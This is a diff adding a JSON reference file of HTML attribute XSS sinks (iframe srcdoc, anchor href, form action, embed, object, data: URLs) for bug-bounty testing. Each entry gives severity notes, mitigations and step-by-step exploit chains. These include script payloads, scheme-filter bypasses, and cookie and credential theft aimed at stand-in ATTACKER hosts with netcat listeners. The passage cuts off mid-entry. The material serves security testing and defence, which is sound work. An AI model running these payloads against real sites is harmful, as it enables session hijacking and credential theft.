@@ -1,0 +1,667 @@
+{
+  "category": "attribute",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-iframe-srcdoc",
+      "name": "iframe srcdoc",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "srcdoc",
+        "iframe.srcdoc",
+        "srcdoc=",
+        "iframe srcdoc"
+      ],
+      "severity": "P2",
+      "severity_note": "Full-HTML execution in the page origin: treat as DOM XSS, P2/P3 depending on source reachability; a hidden hotspot because reviewers and sanitizers focus on src and forget srcdoc.",
+      "explain": "The srcdoc attribute of an iframe accepts a complete HTML document as a string. The embedded document runs in the embedding origin (unless sandboxed), so any tainted markup placed into srcdoc is direct script execution that slips past controls aimed only at URLs.",
+      "how_it_works": "The browser parses the srcdoc string as a full document: script tags, event handlers, forms and styles all live. Because it is markup rather than a URL, scheme filters and URL allowlists never inspect it, and sanitizer configurations that allow iframes but do not forbid the srcdoc attribute pass it through untouched.",
+      "why_it_matters": "srcdoc is the classic blind spot: a team sanitizes iframe src against an allowlist, ships a sanitizer like DOMPurify with default settings (which permit srcdoc on allowed iframes), and an attacker smuggles a whole malicious document through an attribute nobody greps for.",
+      "exploitable_when": [
+        "postMessage-data",
+        "location.search",
+        "URLSearchParams",
+        "xhr-response",
+        "dom-form-values"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm the message handler writes to srcdoc",
+              "payload": "window.postMessage({html:'<b>jlf-trace</b>'},'*')",
+              "command": "open 'https://TARGET/embed' in a browser and run the payload in the console",
+              "indicator": "the iframe body renders bold jlf-trace, proving message data reaches the srcdoc assignment"
+            },
+            {
+              "action": "Detonate script inside srcdoc",
+              "payload": "window.postMessage({html:'<script>alert(document.domain)</script>'},'*')",
+              "command": "run the payload in the console of 'https://TARGET/embed'",
+              "indicator": "an alert fires from inside the iframe, executing in the TARGET origin"
+            },
+            {
+              "action": "Prove cross-frame DOM and cookie access",
+              "payload": "window.postMessage({html:'<script>parent.document.title=String(document.cookie)</script>'},'*')",
+              "command": "run the payload in the console and watch the browser tab title",
+              "indicator": "the top page title changes to the session cookie value, proving the srcdoc document reaches the parent DOM"
+            }
+          ],
+          "eligibility": "srcdoc injection with script execution is standard DOM XSS accepted on all major platforms; a sandbox attribute without allow-scripts kills the chain, so check for sandbox first and record its absence in the report."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Confirm the query value is reflected into srcdoc markup",
+              "payload": "?bio=jlf-trace",
+              "command": "curl -s 'https://TARGET/profile?bio=jlf-trace' | grep -n 'srcdoc'",
+              "indicator": "the traced value appears inside the srcdoc attribute or inside the string assigned to iframe.srcdoc"
+            },
+            {
+              "action": "Inject an event-handler payload into the nested document",
+              "payload": "?bio=<img src=x onerror=alert(document.domain)>",
+              "command": "open 'https://TARGET/profile?bio=<img src=x onerror=alert(document.domain)>' in a browser",
+              "indicator": "a broken-image icon renders and the alert fires when the srcdoc document parses the img tag"
+            }
+          ],
+          "eligibility": "If the value is HTML-encoded before reaching srcdoc the chain is dead; verify the exact encoding in DevTools (view the parsed srcdoc document, not just view-source) before reporting."
+        }
+      ],
+      "contexts": {
+        "attr": "srcdoc as an HTML attribute holds a nested document; quote and entity handling decides breakouts out of the attribute",
+        "js-string": "iframe.srcdoc = value in JavaScript passes raw markup straight to the parser with no attribute-encoding layer",
+        "html-body": "markup inside srcdoc renders as a full document: scripts, forms and styles are all live"
+      },
+      "waf_notes": "URL-scheme WAF rules never see srcdoc because it is markup, not a URL. Server filters that strip script tags but keep event handlers fall to img onerror, svg onload, or body onpageshow. DOMPurify neutralizes srcdoc only when iframes are disallowed or srcdoc is in FORBID_ATTR; default DOMPurify allows srcdoc on allowed iframes in older versions, so test the deployed version.",
+      "eligibility": "Script-executing srcdoc injection is treated exactly like innerHTML XSS by triagers (P2/P3). The common rejection is a present sandbox attribute or correct output encoding, so both must be ruled out with evidence in the report.",
+      "mitigations": [
+        "Never place user input into srcdoc; prefer a sandboxed iframe with a static allowlisted src",
+        "Add the sandbox attribute without allow-scripts and allow-same-origin",
+        "Configure DOMPurify to forbid iframes or to forbid the srcdoc attribute explicitly",
+        "Enforce a CSP script-src without unsafe-inline so inline handlers inside srcdoc cannot run"
+      ],
+      "related": [
+        "iframe src",
+        "innerHTML",
+        "document.write",
+        "data: URL"
+      ],
+      "references": [
+        "PortSwigger: DOM XSS",
+        "MDN: iframe srcdoc attribute",
+        "OWASP: XSS Filter Evasion Cheat Sheet"
+      ]
+    },
+    {
+      "id": "sink-anchor-href",
+      "name": "anchor href",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "a.href",
+        "anchor.href",
+        "link.href",
+        ".href",
+        "href="
+      ],
+      "severity": "P3",
+      "severity_note": "P3 as one-click XSS via a javascript: scheme; P2 when stored and clickable by any user; P4 when the only impact is a lookalike-URL phishing link.",
+      "explain": "Setting the href of an anchor to an attacker-controlled string decides where a click goes. A javascript: scheme executes script in the page origin on click; a data: scheme is mostly neutered for top-level navigation in modern browsers; an https lookalike drives phishing.",
+      "how_it_works": "The browser resolves href at click time. javascript: runs in the current document's origin and inherits its session; HTML-encoding the value does not neutralize the scheme. Since Chrome 60 and Firefox 59, top-level navigation to data: URLs is blocked, so the data:text/html anchor trick is largely historical on desktop engines.",
+      "why_it_matters": "href is the most common URL-bearing attribute in web apps, and scheme validation is the most commonly forgotten check. One missed filter turns a harmless link feature into stored, one-click session theft.",
+      "exploitable_when": [
+        "URLSearchParams",
+        "location.search",
+        "dom-form-values",
+        "localStorage",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches an anchor href",
+              "payload": "?u=javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/page?u=javascript:alert(document.domain)' in a browser and inspect the rendered link in DevTools",
+              "indicator": "the anchor's href property contains the javascript: payload"
+            },
+            {
+              "action": "Bypass a naive scheme filter",
+              "payload": "?u=%20JaVaScRiPt:alert(document.domain)",
+              "command": "open 'https://TARGET/page?u=%20JaVaScRiPt:alert(document.domain)' in a browser and click the link",
+              "indicator": "the alert fires because the leading space and mixed case defeat a prefix filter while the browser still executes the scheme"
+            },
+            {
+              "action": "Prove session access on click",
+              "payload": "?u=javascript:alert(document.cookie)",
+              "command": "click the rendered link in a session logged in as YOUR_ACCOUNT",
+              "indicator": "the alert displays the session cookie of YOUR_ACCOUNT, demonstrating account-takeover impact"
+            }
+          ],
+          "eligibility": "One-click javascript: href injection is accepted as DOM XSS on all major platforms; if the crafted link is reachable only in the attacker's own session it is self-XSS and usually not eligible."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Store the payload in a field rendered as a link",
+              "payload": "javascript:fetch('https://ATTACKER/c?c='+document.cookie)",
+              "command": "save the payload as the homepage field of YOUR_ACCOUNT profile on TARGET",
+              "indicator": "the profile renders a clickable link whose href property is the stored javascript: value"
+            },
+            {
+              "action": "Have a second session click it",
+              "payload": "javascript:fetch('https://ATTACKER/c?c='+document.cookie)",
+              "command": "log in as a second test account, view the attacker's profile, and click the link",
+              "indicator": "the ATTACKER listener logs a request containing the second account's cookie"
+            }
+          ],
+          "eligibility": "Stored plus one click on a real feature is typically P3 (P2 when any user can be targeted); programs that exclude click-required XSS will say so in policy, so check before writing it up."
+        }
+      ],
+      "contexts": {
+        "attr": "href executes javascript: on activation regardless of HTML encoding of the value",
+        "js-string": "element.href = value in JavaScript performs no scheme validation at all",
+        "storage": "persisted values (profiles, bios, comments) convert the sink into stored XSS"
+      },
+      "waf_notes": "data:text/html anchors are blocked as top-level navigation in current Chrome and Firefox, so do not promise that impact on desktop. javascript: bypasses: leading whitespace/control characters, mixed case, HTML entities when the value passes an HTML parse. Server WAFs see the parameter but rarely scheme-check link fields.",
+      "eligibility": "Triage hinges on two facts: does a javascript: scheme survive, and whose click is required. Surviving scheme plus victim click is accepted XSS; scheme stripped or attacker-only click is a rejection.",
+      "mitigations": [
+        "Allow only https: and relative URLs in href assignments",
+        "Render user links through a sanitizer that strips dangerous schemes",
+        "Add rel=\"noopener noreferrer\" to all user-supplied links",
+        "Intercept clicks on user links and re-validate the scheme at activation time"
+      ],
+      "related": [
+        "javascript: URL",
+        "location.href",
+        "form action",
+        "window.open"
+      ],
+      "references": [
+        "PortSwigger: DOM XSS",
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "OWASP WSTG: Testing for Client-Side URL Redirect"
+      ]
+    },
+    {
+      "id": "sink-form-action",
+      "name": "form action",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "form.action",
+        "formaction",
+        "form action",
+        ".action="
+      ],
+      "severity": "P3",
+      "severity_note": "P3 typical for credential exfiltration on submit; P2 on login or payment forms with a demonstrated capture; P4 when the form carries no sensitive data.",
+      "explain": "The action attribute of a form (or the formaction attribute of a submit button) decides where the submitted data goes. Attacker control over it turns a genuine TARGET form into a credential drop that POSTs everything the victim types to an attacker endpoint.",
+      "how_it_works": "On submit the browser sends every named field to the action URL, no JavaScript required. formaction on a submit button overrides the form's own action, so attribute injection into a single button hijacks the whole form. The submission is a normal cross-origin POST and succeeds even when the attacker endpoint has no CORS headers.",
+      "why_it_matters": "Form-action hijack is silent credential theft on the site's own login page: the URL bar, certificate and page content are all genuine TARGET, only the submission destination changes. It bypasses password-manager heuristics less reliably than a clone but needs no clone hosting at all when the action alone is injectable.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "dom-form-values",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value lands in the form action",
+              "payload": "?next=https://ATTACKER/collect",
+              "command": "curl -s 'https://TARGET/login?next=https://ATTACKER/collect' | grep -n 'action='",
+              "indicator": "the rendered form tag carries action=\"https://ATTACKER/collect\""
+            },
+            {
+              "action": "Stand up the capture listener",
+              "payload": "no payload needed; the form submits its real fields",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host (or use a Burp Collaborator / interactsh endpoint)",
+              "indicator": "the listener is ready to receive the cross-origin POST"
+            },
+            {
+              "action": "Submit the genuine form",
+              "payload": "test credentials for YOUR_ACCOUNT typed into the real TARGET login form",
+              "command": "open 'https://TARGET/login?next=https://ATTACKER/collect' in a browser and submit the form",
+              "indicator": "the listener logs a POST body containing the username and password just typed, while the address bar never left TARGET before submit"
+            }
+          ],
+          "eligibility": "Form-action hijack on an authentication or payment form is accepted as credential theft (P2/P3); on search or newsletter forms most programs rate it P4 or informational. A video of the capture is the deciding evidence."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Find a stored field reflected into a submit button formaction",
+              "payload": "https://ATTACKER/collect",
+              "command": "save the payload in the injectable profile field of YOUR_ACCOUNT and run curl -s on the affected page, grepping for 'formaction'",
+              "indicator": "the rendered submit button carries formaction=\"https://ATTACKER/collect\""
+            },
+            {
+              "action": "Trigger the hijacked submit",
+              "payload": "victim entries in the real form fields",
+              "command": "log in as a second test account, open the affected page, fill the form, and click submit",
+              "indicator": "the ATTACKER listener receives the full form POST including the second account's entered data"
+            }
+          ],
+          "eligibility": "formaction injection is HTML injection with direct data-theft impact; platforms accept it at P3 when the form collects sensitive fields, lower for benign forms. Note that the injected attribute needs no click beyond the normal form submission."
+        }
+      ],
+      "contexts": {
+        "attr": "action and formaction are URL attributes; quotes decide breakout but scheme filtering is rare",
+        "js-string": "form.action = value in JavaScript performs zero validation and overrides any static action",
+        "html-body": "a form with a hijacked action looks byte-identical to the victim apart from the attribute value"
+      },
+      "waf_notes": "action values are rarely scheme-checked because they are expected to be URLs; javascript: in form action is dead on modern browsers, but an https://ATTACKER endpoint needs no bypass at all. Review server templates that concatenate action values with request parameters, and remember formaction on buttons overrides the form-level attribute.",
+      "eligibility": "Severity tracks the sensitivity of the form fields, not the injection itself. Login/payment forms with demonstrated capture: P2/P3. Benign forms: P4/informational. CSP form-action is the specific mitigation triagers will ask about; record its absence.",
+      "mitigations": [
+        "Never reflect request data into action or formaction attributes",
+        "Send a Content-Security-Policy form-action directive restricting submit destinations",
+        "Hard-code form actions server-side and reference routes by id",
+        "Alert on unexpected action hosts in client-side monitoring"
+      ],
+      "related": [
+        "anchor href",
+        "javascript: URL",
+        "iframe src",
+        "location.href"
+      ],
+      "references": [
+        "OWASP WSTG: Testing for DOM-based XSS",
+        "PortSwigger: DOM-based vulnerabilities",
+        "MDN: formaction attribute"
+      ]
+    },
+    {
+      "id": "sink-iframe-src",
+      "name": "iframe src",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "iframe.src",
+        "iframe src",
+        "frame.src",
+        "iframe.setAttribute"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as arbitrary content injection/phishing; P3 with a demonstrated credential-harvest overlay or when frame-ancestors absence adds clickjacking; javascript: in iframe src executed in the parent origin only on legacy engines.",
+      "explain": "Setting the src of an iframe to an attacker-controlled URL embeds arbitrary external content inside a genuine TARGET page. The frame can render a pixel-perfect phishing UI, and on legacy engines a javascript: URL in iframe src executed in the parent origin.",
+      "how_it_works": "The iframe creates a nested browsing context for the supplied URL. Cross-origin content cannot read the parent DOM, but it can look exactly like the parent page, overlay real forms, and harvest anything typed into it. Without a sandbox attribute the framed content can also navigate the top frame in some configurations.",
+      "why_it_matters": "An attacker-controlled iframe inside a trusted page is phishing with a genuine URL bar and certificate. It is also the primitive that turns missing frame-ancestors headers into clickjacking findings, and the src value is a common XSS escalation slot on old engines.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "postMessage-data",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches iframe.src",
+              "payload": "?src=https://ATTACKER/clone",
+              "command": "curl -s 'https://TARGET/preview?src=https://ATTACKER/clone' | grep -n 'iframe'",
+              "indicator": "the rendered iframe tag carries src=\"https://ATTACKER/clone\" or the served JavaScript assigns it"
+            },
+            {
+              "action": "Load the attacker frame in a browser",
+              "payload": "?src=https://ATTACKER/clone",
+              "command": "open 'https://TARGET/preview?src=https://ATTACKER/clone' in a browser with DevTools Network open",
+              "indicator": "the Network tab shows a request to ATTACKER and the framed clone renders inside the TARGET page"
+            },
+            {
+              "action": "Demonstrate credential capture through the overlay",
+              "payload": "ATTACKER/clone renders a TARGET-styled login form posting to https://ATTACKER/collect",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host and submit test credentials inside the frame",
+              "indicator": "the listener logs the POSTed credentials for YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Arbitrary iframe content injection alone is usually P4; it reaches P3 with a demonstrated credential capture, and it pairs well with a missing frame-ancestors clickjacking report. Pure cosmetic embedding is often rejected."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Probe the javascript: slot",
+              "payload": "?src=javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/preview?src=javascript:alert(document.domain)' in a current browser and in the oldest in-scope engine",
+              "indicator": "current Chrome and Firefox do not execute javascript: assigned to iframe src cross-context; legacy engines executed it in the parent origin, so record exact per-engine behavior"
+            },
+            {
+              "action": "Probe the data: slot",
+              "payload": "?src=data:text/html,<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/preview?src=data:text/html,<script>alert(document.domain)</script>' in a browser",
+              "indicator": "where the data: document loads, its script runs in an opaque origin with no access to TARGET cookies or DOM, which caps the impact and must be stated honestly"
+            }
+          ],
+          "eligibility": "Scheme escalation on iframe src is mostly historical: modern engines refuse or sandbox it into an opaque origin. Report it only with a named engine that executes with TARGET-origin access; otherwise it stays P4 content injection."
+        }
+      ],
+      "contexts": {
+        "attr": "src is a URL attribute; scheme filtering is the only thing between the attacker and embedded content",
+        "js-string": "iframe.src = value performs no validation; combine with srcdoc review because both reach the same frame",
+        "sandbox": "presence and flags of the sandbox attribute decide whether framed script can run at all"
+      },
+      "waf_notes": "URL allowlists on iframe src often check host suffixes: 'https://TARGET.ATTACKER' and 'https://ATTACKER/TARGET' both defeat naive contains-matching. data: and javascript: scheme handling differs across engines and versions, so per-browser testing is mandatory before claiming XSS impact.",
+      "eligibility": "Triage baseline is P4 content injection. Escalators: working credential capture (P3), javascript: execution with parent-origin access on an in-scope engine (P2/P3), or combination with clickjacking. An opaque-origin data: execution does not count as TARGET XSS.",
+      "mitigations": [
+        "Allowlist iframe src hosts and schemes strictly",
+        "Apply a sandbox attribute with the minimum required flags",
+        "Send frame-ancestors and X-Frame-Options on sensitive pages",
+        "Use CSP frame-src to constrain where frames may load from"
+      ],
+      "related": [
+        "iframe srcdoc",
+        "embed src",
+        "object data",
+        "data: URL"
+      ],
+      "references": [
+        "OWASP WSTG: Testing for Clickjacking",
+        "MDN: iframe element",
+        "PortSwigger: DOM-based vulnerabilities"
+      ]
+    },
+    {
+      "id": "sink-embed-src",
+      "name": "embed src",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "embed.src",
+        "embed src",
+        "<embed",
+        "type=text/html"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as content injection; modern plugin support is gone, so impact mirrors a weaker iframe src; P3 only with a demonstrated credential-capture overlay via type=\"text/html\".",
+      "explain": "The embed element loads an external resource into the page through a plugin or, with type=\"text/html\", through a nested browsing context similar to an iframe. A tainted src embeds attacker content inside a genuine TARGET page.",
+      "how_it_works": "Historically embed loaded Flash and PDF plugins with their own vulnerability surface. Today plugins are dead, so the realistic attack is type=\"text/html\" embedding, which behaves like an unsandboxed iframe: attacker HTML renders inside the TARGET page and can phish or overlay real UI.",
+      "why_it_matters": "embed slips through reviews that only audit iframe; sanitizers and WAF signatures frequently omit it. Any code path that reflects a URL into an embed tag recreates iframe-style content injection under a different tag name.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "postMessage-data",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches the embed src",
+              "payload": "?file=https://ATTACKER/page.html",
+              "command": "curl -s 'https://TARGET/view?file=https://ATTACKER/page.html' | grep -n 'embed'",
+              "indicator": "the rendered embed tag carries src=\"https://ATTACKER/page.html\""
+            },
+            {
+              "action": "Load attacker HTML through the embed",
+              "payload": "ATTACKER/page.html renders a TARGET-styled login form posting to https://ATTACKER/collect",
+              "command": "open 'https://TARGET/view?file=https://ATTACKER/page.html' in a browser and submit test credentials in the embedded form",
+              "indicator": "the ATTACKER listener logs the POSTed credentials for YOUR_ACCOUNT"
+            },
+            {
+              "action": "Check the embed type handling",
+              "payload": "?file=https://ATTACKER/page.html&type=text/html",
+              "command": "open 'https://TARGET/view?file=https://ATTACKER/page.html&type=text/html' in a browser",
+              "indicator": "the type parameter controls whether the content renders as a nested document; without text/html many browsers download or blank the resource"
+            }
+          ],
+          "eligibility": "Same economics as iframe src: P4 content injection, P3 with demonstrated credential capture. Many programs treat embed injection as duplicate of iframe findings on the same page; report the strongest variant."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Probe the data: scheme slot",
+              "payload": "?file=data:text/html,<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/view?file=data:text/html,<script>alert(document.domain)</script>' in a browser",
+              "indicator": "where the data: document loads, any script runs in an opaque origin with no TARGET session access; modern Chrome refuses many data: subresource loads, so record the exact behavior"
+            },
+            {
+              "action": "Probe the javascript: scheme slot",
+              "payload": "?file=javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/view?file=javascript:alert(document.domain)' in the oldest in-scope engine",
+              "indicator": "modern engines do not execute javascript: in embed src; only legacy plugin-era engines did, which caps this at informational unless an in-scope engine fires"
+            }
+          ],
+          "eligibility": "Scheme escalations on embed src are effectively dead on current browsers; report them as informational unless a named in-scope engine executes with TARGET-origin access."
+        }
+      ],
+      "contexts": {
+        "attr": "src and type together decide rendering; type confusion between plugin and nested-document modes changes the attack surface",
+        "js-string": "embed.src = value performs no validation, identical exposure to iframe.src",
+        "html-body": "embed is not self-closing-friendly in all sanitizers; check whether the sanitizer strips it or leaves it unaudited"
+      },
+      "waf_notes": "WAF tag allowlists that permit embed for media content rarely restrict src hosts. Host-suffix checks fall to 'TARGET.ATTACKER' style confusion exactly like iframe src. The type attribute is almost never filtered and is the switch that makes HTML rendering possible.",
+      "eligibility": "Honest baseline: P4 content injection with rare escalation. The tag's value in a report is showing the app embeds attacker-controlled documents at all; credential capture or a same-origin type confusion is what raises the payout.",
+      "mitigations": [
+        "Remove embed usage in favor of sandboxed iframes",
+        "Allowlist src hosts and pin the type attribute",
+        "Send CSP frame-src and object-src 'none' where plugins are not needed",
+        "Strip embed tags in any user-influenced HTML pipeline"
+      ],
+      "related": [
+        "iframe src",
+        "object data",
+        "iframe srcdoc",
+        "data: URL"
+      ],
+      "references": [
+        "MDN: embed element",
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "OWASP WSTG: Testing for Clickjacking"
+      ]
+    },
+    {
+      "id": "sink-object-data",
+      "name": "object data",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "object.data",
+        "object data",
+        "<object",
+        "data=text/html"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as content injection; P3 via the uploaded-SVG chain, where a TARGET-hosted SVG with script executes in the TARGET origin when loaded through object data.",
+      "explain": "The data attribute of an object element embeds an external resource as a nested document or plugin. A tainted value embeds attacker content; the high-value variant points object data at an attacker-uploaded SVG on TARGET itself, whose script then executes in the TARGET origin.",
+      "how_it_works": "object data loads the resource into a nested browsing context. Documents loaded from the same origin keep that origin, so an SVG uploaded to TARGET (avatar, attachment, logo) containing a script element executes with full TARGET session access when rendered through object, unlike an img tag which never runs SVG script.",
+      "why_it_matters": "It bridges a harmless-looking file-upload feature into stored XSS: the upload supplies the payload, the tainted object data supplies the execution context. Reviews that check uploads for images but render them via object miss the combination entirely.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "dom-form-values",
+        "xhr-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query value reaches object data",
+              "payload": "?file=https://ATTACKER/page.html",
+              "command": "curl -s 'https://TARGET/embed?file=https://ATTACKER/page.html' | grep -n 'object'",
+              "indicator": "the rendered object tag carries data=\"https://ATTACKER/page.html\""
+            },
+            {
+              "action": "Demonstrate the phishing overlay",
+              "payload": "ATTACKER/page.html renders a TARGET-styled login form posting to https://ATTACKER/collect",
+              "command": "open 'https://TARGET/embed?file=https://ATTACKER/page.html' in a browser and submit test credentials in the embedded form",
+              "indicator": "the ATTACKER listener logs the POSTed credentials for YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Cross-origin object injection is iframe-equivalent content injection: P4 standalone, P3 with demonstrated capture. Check whether the app intended object only for same-origin media, which strengthens the argument."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Upload an SVG carrying script",
+              "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>",
+              "command": "upload the file as the avatar of YOUR_ACCOUNT on TARGET, then run curl -s -I on its URL and check the content-type header",
+              "indicator": "the avatar URL is served with content-type image/svg+xml from the TARGET origin"
+            },
+            {
+              "action": "Point the tainted object data at the uploaded SVG",
+              "payload": "?file=/uploads/YOUR_ACCOUNT/avatar.svg",
+              "command": "open 'https://TARGET/embed?file=/uploads/YOUR_ACCOUNT/avatar.svg' in a browser",
+              "indicator": "the alert fires with document.domain equal to TARGET, proving same-origin script execution through the object"
+            },
+            {
+              "action": "Confirm the img-tag control does not fire",
+              "payload": "<img src=\"/uploads/YOUR_ACCOUNT/avatar.svg\">",
+              "command": "render the same SVG through an img tag on a test page",
+              "indicator": "no alert fires via img, demonstrating the execution depends specifically on the object rendering path"
+            }
+          ],
+          "eligibility": "The SVG-via-object chain is accepted as stored XSS (P2/P3) when upload and injection combine on the same origin. Standalone object-data injection to external https content stays P4 phishing."
+        }
+      ],
+      "contexts": {
+        "attr": "data is a URL attribute; typemustmatch and type attributes change how strictly the browser enforces the declared content",
+        "upload": "same-origin uploads (SVG especially) become executable when rendered through object instead of img",
+        "js-string": "object.data = value performs no validation and is the DOM-side equivalent of the attribute injection"
+      },
+      "waf_notes": "Upload filters that check magic bytes but serve files as image/svg+xml are the enabler; the object tag itself is rarely on WAF blocklists. Content-Disposition: attachment on uploads kills the chain; its absence is a finding worth one line in the report.",
+      "eligibility": "Two-tier reality: external-content injection is P4 phishing economics, while the same-origin SVG execution is real stored XSS. Present the chain end-to-end (upload, content-type, object rendering) or triage will only see the low half.",
+      "mitigations": [
+        "Serve user uploads from a separate domain with Content-Disposition: attachment",
+        "Allowlist object data URLs to same-origin static media",
+        "Send CSP object-src 'none' unless plugins are required",
+        "Convert uploaded SVG to raster formats before serving"
+      ],
+      "related": [
+        "embed src",
+        "iframe src",
+        "data: URL",
+        "iframe srcdoc"
+      ],
+      "references": [
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "PortSwigger: File upload vulnerabilities",
+        "MDN: object element"
+      ]
+    },
+    {
+      "id": "sink-data-url",
+      "name": "data: URL",
+      "category": "attribute",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "data:text/html",
+        "data:",
+        "dataurl",
+        "data-url"
+      ],
+      "severity": "P4",
+      "severity_note": "Honest rating: mostly defanged for top-level navigation since Chrome 60 and Firefox 59; still dangerous in WebViews, legacy engines, and SVG-via-object/embed contexts, so P4/P5 unless a named in-scope engine executes it.",
+      "explain": "A data: URL embeds the resource inline: data:[mediatype][;base64],payload. When a sink (iframe src, object data, window.open, location) accepts a tainted data:text/html URL, the attacker ships a whole document inside the URL itself with no server round-trip.",
+      "how_it_works": "The browser decodes the mediatype and payload and renders it as a document. Top-level navigation to data: URLs has been blocked in current Chrome and Firefox for years, and subframe data: documents receive an opaque origin, so script inside them cannot touch the embedding page's cookies or DOM. Execution with the TARGET origin survives mainly through same-origin tricks like SVG uploads rendered via object, or through outdated WebViews.",
+      "why_it_matters": "data: URLs are the payload format that never touches a server: no log lines, no WAF visibility, no hosting infrastructure. Understanding exactly where they still execute (and where they are dead) keeps reports honest and focuses effort on the contexts that pay.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "URLSearchParams",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the hash is decoded into a data: URL slot",
+              "payload": "#PGI+amxmLXRyYWNlPC9iPg==",
+              "command": "open 'https://TARGET/render#PGI+amxmLXRyYWNlPC9iPg==' in a browser with a breakpoint where the iframe src is assigned",
+              "indicator": "the base64 decodes to '<b>jlf-trace</b>' inside a data:text/html URL assigned to the frame"
+            },
+            {
+              "action": "Detonate script inside the data: document",
+              "payload": "#PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
+              "command": "open 'https://TARGET/render#PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+' in each in-scope browser",
+              "indicator": "on engines that allow data: subframes the alert fires with an opaque origin (document.domain is empty), proving execution but no TARGET session access"
+            },
+            {
+              "action": "Attempt parent access from the data: document",
+              "payload": "base64 of '<script>alert(parent.document.cookie)</script>'",
+              "command": "repeat the open with the parent-access payload",
+              "indicator": "the access throws a cross-origin error on modern engines, which caps the impact; document this honestly instead of claiming TARGET XSS"
+            }
+          ],
+          "eligibility": "data: XSS in subframes runs in an opaque origin with no cookie or DOM access to TARGET, so many triagers reject it outright; escalate only when a same-origin context (object-rendered SVG upload) or an in-scope legacy engine provides real session access."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Probe a top-level navigation sink with a data: URL",
+              "payload": "?u=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
+              "command": "curl -s 'https://TARGET/continue?u=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+' | grep -n 'data:'",
+              "indicator": "the data: URL survives sanitization into the navigation sink in the served page"
+            },
+            {
+              "action": "Test navigation per engine",
+              "payload": "?u=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
+              "command": "open 'https://TARGET/continue?u=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+' in current Chrome and in the target Android WebView",
+              "indicator": "current desktop browsers block the top-level data: navigation; in-scope WebViews or legacy engines may execute, and only those results are reportable"
+            }
+          ],
+          "eligibility": "Report only with a named in-scope engine that executes the payload; on modern desktop browsers this is informational because top-level data: navigation is blocked by design."
+        }
+      ],
+      "contexts": {
+        "url-scheme": "data: is a scheme; every URL-accepting sink is a potential carrier, and scheme allowlists are the only real control",
+        "subframe": "data: documents in subframes get an opaque origin, so execution does not equal session access",
+        "svg": "data:image/svg+xml carries script that runs when the SVG is navigated to directly or rendered via object or embed"
+      },
+      "waf_notes": "Base64 payloads defeat every keyword filter, and fragment-delivered data: URLs never reach a server WAF. The enforcement layer that matters is browser behavior (top-level block, opaque origins) plus CSP: a script-src without data: and an object-src 'none' close the remaining execution paths.",
+      "eligibility": "The honest verdict: data: URL injection is a delivery mechanism, not impact. Payout requires demonstrating execution with meaningful origin access on an in-scope engine; otherwise expect informational or duplicate-of-open-redirect triage.",
+      "mitigations": [
